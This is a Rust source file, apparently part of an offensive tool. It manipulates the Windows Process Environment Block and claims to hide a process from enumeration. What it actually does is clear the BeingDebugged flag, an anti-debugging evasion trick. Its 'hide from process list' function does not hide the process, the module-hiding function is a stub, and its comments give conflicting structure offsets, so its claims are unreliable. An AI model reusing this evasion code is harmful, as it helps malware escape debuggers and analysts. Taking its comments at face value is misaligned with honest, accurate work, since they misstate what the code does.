// PEB Manipulation
// Hides process from enumeration and modifies PEB structure

use std::ptr;
use winapi::shared::minwindef::*;
use winapi::um::winnt::*;

/// Get PEB address
pub unsafe fn get_peb() -> *mut winapi::ctypes::c_void {
    #[cfg(target_arch = "x86_64")]
    {
        let peb: *mut winapi::ctypes::c_void;
        std::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );
        peb
    }

    #[cfg(target_arch = "x86")]
    {
        let peb: *mut winapi::ctypes::c_void;
        std::arch::asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb,
            options(nostack, nomem, preserves_flags)
        );
        peb
    }

    #[cfg(not(any(target_arch = "x86", target_arch = "x86_64")))]
    {
        ptr::null_mut()
    }
}

/// Hide process from process list by manipulating PEB
pub unsafe fn hide_from_process_list() -> Result<(), String> {
    let peb = get_peb();
    if peb.is_null() {
        return Err("Failed to get PEB".to_string());
    }

    // PEB structure (simplified):
    // +0x00: InheritedAddressSpace
    // +0x01: ReadImageFileExecOptions
    // +0x02: BeingDebugged (already handled in evasion.rs)
    // +0x08: Ldr (PEB_LDR_DATA pointer)

    // Manipulate PEB->Ldr to hide loaded modules
    // This is complex and requires understanding of PEB_LDR_DATA structure
    // For now, we'll just clear BeingDebugged flag (already done in evasion)

    // Clear BeingDebugged flag (offset 0x02)
    let being_debugged = peb.add(0x02) as *mut u8;
    *being_debugged = 0;

    Ok(())
}

/// Hide loaded modules from PEB
pub unsafe fn hide_loaded_modules() -> Result<(), String> {
    let peb = get_peb();
    if peb.is_null() {
        return Err("Failed to get PEB".to_string());
    }

    // PEB->Ldr is at offset 0x18 (x64) or 0x0C (x86)
    #[cfg(target_arch = "x86_64")]
    {
        // Ldr pointer is at PEB + 0x18
        let ldr_ptr = peb.add(0x18) as *mut *mut winapi::ctypes::c_void;
        // Clear Ldr pointer to hide modules
        // Note: This may cause issues, so we'll just set it to null temporarily
        // In practice, you'd want to manipulate the linked list structure
        // *ldr_ptr = ptr::null_mut();
    }

    #[cfg(target_arch = "x86")]
    {
        // Ldr pointer is at PEB + 0x0C
        let ldr_ptr = peb.add(0x0C) as *mut *mut winapi::ctypes::c_void;
        // Similar manipulation for x86
    }

    Ok(())
}

/// Manipulate PEB to hide process
pub unsafe fn manipulate_peb() -> Result<(), String> {
    hide_from_process_list()?;
    // hide_loaded_modules()?; // Commented out - can cause issues
    Ok(())
}
